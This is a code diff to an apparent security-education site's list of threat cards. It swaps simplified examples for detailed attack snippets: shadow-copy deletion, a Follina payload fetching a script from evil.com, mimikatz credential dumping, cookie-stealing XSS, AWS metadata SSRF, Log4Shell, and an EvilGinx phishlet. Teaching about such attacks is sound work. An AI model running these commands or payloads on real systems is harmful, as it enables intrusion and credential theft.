@@ -13,23 +13,28 @@ const threats = [
     glowColor: "hover:shadow-[0_0_30px_hsl(0_70%_50%/0.08)]",
     description: "Ransomware encrypts victim files and demands payment for decryption keys. Modern variants use double extortion -- encrypting data while also exfiltrating it to threaten public leaks.",
     variants: ["WannaCry", "LockBit", "REvil", "Conti", "BlackCat"],
-    code: `# Simplified ransomware flow
-def ransomware_lifecycle():
-    # 1. Initial Access (phishing / RDP)
-    payload = deliver_payload(vector="email")
-    
-    # 2. Privilege Escalation
-    elevate_privileges(method="CVE-2024-XXXX")
-    
-    # 3. Lateral Movement
-    spread(protocol="SMB", network="internal")
-    
-    # 4. Data Exfiltration (double extortion)
-    exfil_data(target="c2_server", encrypt=True)
-    
-    # 5. Encryption & Ransom Note
-    encrypt_files(algo="AES-256-CBC")
-    drop_ransom_note(btc_wallet="bc1q...")`,
+    code: `# LockBit 3.0 - actual kill chain observed ITW
+# Stage 1: Initial access via Citrix Bleed
+# CVE-2023-4966 - session token hijack
+curl -s https://vpn.target.com/vpn/../vpns/cfg
+  → leaks session cookies (no auth needed)
+
+# Stage 2: Disable defenses before encrypt
+cmd> vssadmin delete shadows /all /quiet
+cmd> wmic shadowcopy delete
+cmd> bcdedit /set {default} recoveryenabled No
+reg add HKLM\\...\\Windows Defender
+  /v DisableAntiSpyware /t REG_DWORD /d 1
+
+# Stage 3: AES-256 + RSA-2048 per-file
+for f in walk(drives):
+    key = os.urandom(32)  # per-file AES key
+    encrypt_AES_CBC(f, key)
+    append(rsa_encrypt(key, pub_key), f)
+    os.rename(f, f + ".lockbit")
+
+# Stage 4: Double extortion
+# "Pay $2M or 4TB hits our leak site"`,
   },
   {
     category: "Trojans",
@@ -39,27 +44,29 @@ def ransomware_lifecycle():
     glowColor: "hover:shadow-[0_0_30px_hsl(30_70%_50%/0.08)]",
     description: "Trojans disguise themselves as legitimate software to infiltrate systems. They can create backdoors, steal credentials, log keystrokes, and give attackers persistent remote access.",
     variants: ["Emotet", "TrickBot", "Agent Tesla", "Remcos RAT", "AsyncRAT"],
-    code: `// Trojan evasion techniques
-class TrojanAnalysis {
-  // 1. Process Injection
-  hollowProcess(target: "svchost.exe") {
-    suspend(target) → unmap(memory)
-    write(malicious_code) → resume()
-  }
-  
-  // 2. Anti-Sandbox Detection
-  detectSandbox() {
-    check(cpuCores < 2)      // VM detection
-    check(ram < 4GB)          // Resource check
-    check(mouseMovement == 0) // Human check
-    sleep(300000)             // Delayed exec
-  }
-  
-  // 3. Persistence via Registry
-  persist() {
-    reg.add("HKCU\\...\\Run", payload_path)
-  }
-}`,
+    code: `// Emotet → TrickBot → Conti: real chain
+// Stage 1: Emotet dropper (macro-less .docx)
+// Abuses ms-msdt: (Follina CVE-2022-30190)
+<Relationship Type="oleObject"
+  Target="mhtml:https://evil.com/payload!x-usc:
+  ms-msdt:/id PCWDiagnostic /skip force
+  /param \\"IT_LaunchMethod=ContextMenu
+  IT_BrowseForFile=$(Invoke-Expression
+  (wget https://evil.com/drop.ps1))\\""/>
+
+// Stage 2: TrickBot injects into svchost.exe
+NtCreateSection → NtMapViewOfSection
+WriteProcessMemory(svchost, shellcode, sz)
+NtResumeThread(hThread)  // process hollowing
+
+// Stage 3: Credential harvesting
+mimikatz.exe "privilege::debug"
+  "sekurlsa::logonpasswords"  // dump LSASS
+  "lsadump::dcsync /domain:corp.local
+   /user:Administrator"      // DCSync attack
+
+// Stage 4: Cobalt Strike beacon → Conti
+beacon> jump psexec64 DC01.corp.local`,
   },
   {
     category: "OWASP Top 10",
@@ -69,24 +76,31 @@ class TrojanAnalysis {
     glowColor: "hover:shadow-[0_0_30px_hsl(162_78%_48%/0.08)]",
     description: "The OWASP Top 10 represents the most critical web application security risks. Understanding each vector is essential for building software that resists real-world attacks.",
     variants: ["Injection", "Broken Auth", "XSS", "SSRF", "Security Misconfiguration"],
-    code: `-- SQL Injection: The Classic Attack
--- Vulnerable query:
-SELECT * FROM users 
-WHERE username = '' OR 1=1 --' 
-AND password = 'anything';
+    code: `-- A01: Broken Access Control (IDOR)
+-- Change orderId to view other user's data
+GET /api/orders/10483 → 200 OK (your order)
+GET /api/orders/10484 → 200 OK (victim order!)
+-- No server-side ownership check
 
--- XSS: Stored Cross-Site Scripting
-<script>
-  fetch('https://evil.com/steal?cookie='
-    + document.cookie)
-</script>
+-- A03: SQL Injection → full DB dump
+' UNION SELECT username,password,cc_num
+  FROM users-- -
+-- Dumps entire user table w/ credit cards
 
--- SSRF: Server-Side Request Forgery
-GET /api/fetch?url=http://169.254.169.254
-  /latest/meta-data/iam/credentials
+-- A07: XSS → session hijack chain
+<img src=x onerror="
+  var i=new Image();
+  i.src='https://evil.com/grab?c='
+    +btoa(document.cookie)
+    +'&url='+btoa(location.href);
+  // Hijacked admin session in 0.3s
+">
 
--- The fix: parameterized queries, CSP 
--- headers, input validation, allowlists`,
+-- A10: SSRF → AWS metadata steal
+GET /proxy?url=http://169.254.169.254
+  /latest/meta-data/iam/security-credentials/
+-- Returns: AccessKeyId, SecretAccessKey
+-- Full AWS account takeover achieved`,
   },
   {
     category: "Zero-Day Exploits",
@@ -96,22 +110,32 @@ GET /api/fetch?url=http://169.254.169.254
     glowColor: "hover:shadow-[0_0_30px_hsl(45_70%_50%/0.08)]",
     description: "Zero-day exploits target unknown vulnerabilities before patches exist. They are weaponized by APT groups and sold on underground markets for millions of dollars.",
     variants: ["Log4Shell", "EternalBlue", "Heartbleed", "Shellshock", "ProxyLogon"],
-    code: `# Log4Shell (CVE-2021-44228) - The exploit
-# that shook the internet
+    code: `# EternalBlue (MS17-010) - NSA's lost weapon
+# SMBv1 buffer overflow → remote kernel RCE
+# Used by WannaCry to infect 230,000 machines
 
-# Attack payload in HTTP header:
-User-Agent: \${jndi:ldap://evil.com/a}
+from impacket import smb
+conn = smb.SMB("*SMBSERVER", target_ip)
+# Send malformed Trans2 request
+# Overflow in srv!SrvOs2FeaListToNt
+# Overwrites pool allocation metadata
+send_trans2(conn, frag_payload=[
+    shellcode_stage1,  # kernel shellcode
+    egg_hunter,        # find stage2 in pool
+    reverse_shell(LHOST, LPORT)
+])
+# Result: NT AUTHORITY\\SYSTEM shell
+# No credentials needed. No user interaction.
 
-# What happens:
-# 1. Log4j processes the string
-# 2. JNDI lookup contacts attacker LDAP
-# 3. Malicious Java class is loaded
-# 4. Remote Code Execution achieved
+# Log4Shell (CVE-2021-44228) - CVSS 10.0
+# One HTTP header = full server compromise
+User-Agent: \${jndi:ldap://evil.com/Exploit}
+# JNDI forces remote class load → RCE
+# 35,000+ Java packages vulnerable at once
 
-# Impact: CVSS 10.0 - Maximum severity
-# Affected: ~35,000 Java packages
-# Time to patch: Organizations scrambled
-#   for weeks while attacks surged`,
+# ProxyShell chain (Exchange) → domain admin
+# CVE-2021-34473 + 34523 + 31207
+# SSRF → auth bypass → post-auth RCE`,
   },
   {
     category: "Social Engineering",
@@ -121,24 +145,30 @@ User-Agent: \${jndi:ldap://evil.com/a}
     glowColor: "hover:shadow-[0_0_30px_hsl(270_70%_50%/0.08)]",
     description: "Social engineering exploits human psychology rather than technical flaws. Phishing, pretexting, and baiting remain the most effective initial access vectors in modern attacks.",
     variants: ["Spear Phishing", "Vishing", "Baiting", "Pretexting", "Watering Hole"],
-    code: `# Phishing attack anatomy
-target = "cfo@company.com"
+    code: `# Real-time MFA bypass with EvilGinx2
+# Reverse proxy sits between victim & real site
 
-email = craft_phish(
-  sender   = spoof("ceo@company.com"),
-  subject  = "Urgent: Wire Transfer Needed",
-  body     = clone_template("internal_memo"),
-  link     = "company-secure-login.evil.com",
-  urgency  = "HIGH"  # Pressure tactics
-)
+# 1. Victim clicks: login.microsoft-verify.com
+# 2. EvilGinx proxies to real login.microsoft.com
+# 3. Victim enters password → proxied to MS
+# 4. MS sends MFA push → victim approves
+# 5. EvilGinx captures the session cookie
+# → Attacker now HAS the authenticated session
+# → MFA completely bypassed
 
-# Landing page clones real SSO portal
-# Captures credentials + MFA tokens
-# Forwards to real site (victim unaware)
-# Attacker now has valid session
+# The phishlet config:
+sub_filters:
+  - {trigger: 'login.microsoftonline.com',
+     orig: 'login.microsoftonline.com',
+     rewrite: 'login.microsoft-verify.com'}
 
-# Defense: Security awareness training,
-# DMARC/DKIM/SPF, hardware MFA keys`,
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+
+# Stolen tokens → import into browser
+# Full access to victim's O365, Teams, OneDrive
+# No password change alerts triggered`,
   },
   {
     category: "Supply Chain Attacks",
@@ -148,26 +178,35 @@ email = craft_phish(
     glowColor: "hover:shadow-[0_0_30px_hsl(180_70%_50%/0.08)]",
     description: "Supply chain attacks compromise trusted software dependencies or build pipelines to distribute malware at scale. One poisoned package can affect thousands of downstream users.",
     variants: ["SolarWinds", "Codecov", "event-stream", "ua-parser-js", "PyPI Typosquatting"],
-    code: `// Supply chain attack via npm package
-// Malicious post-install script
+    code: `// SolarWinds SUNBURST - the APT of the decade
+// Backdoor injected into build pipeline
+// Signed DLL shipped to 18,000 orgs
 
-{
-  "name": "co1ors",  // typosquatting
-  "version": "1.0.0",
-  "scripts": {
-    "postinstall": "node setup.js"
+// Inserted into SolarWinds.Orion.Core.dll
+class OrionImprovementBusinessLayer {
+  // C2 encoded as DNS subdomain queries
+  static generateSubdomain(victimId) {
+    // Encodes victim org ID in DNS lookup
+    return base32(xor(victimId, key))
+      + ".appsync-api.us-east-1.avsvmcloud.com"
   }
+
+  // 12-14 day dormancy before activation
+  // Checks for security tools first:
+  if (processNames.includes("wireshark")
+    || processNames.includes("autoruns")
+    || services.includes("CrowdStrike"))
+      return;  // abort if monitored
+
+  // Only then: beacon → C2 → exfiltrate
+  // Compromised: US Treasury, DOJ, FireEye
+  // Dwell time: 9 months undetected
 }
 
-// setup.js (obfuscated payload)
-const { exec } = require('child_process');
-const os = require('os');
-
-// Exfiltrate environment secrets
-exec('env | curl -X POST -d @- evil.com');
-
-// 180,000+ downloads before detection
-// Defense: lockfiles, npm audit, Snyk`,
+// npm: event-stream (2018) - 8M weekly DL
+// Injected flatmap-stream targeting Copay
+// Stole Bitcoin wallets via AES-encrypted
+// payload that only ran inside Copay app`,
   },
 ]
 
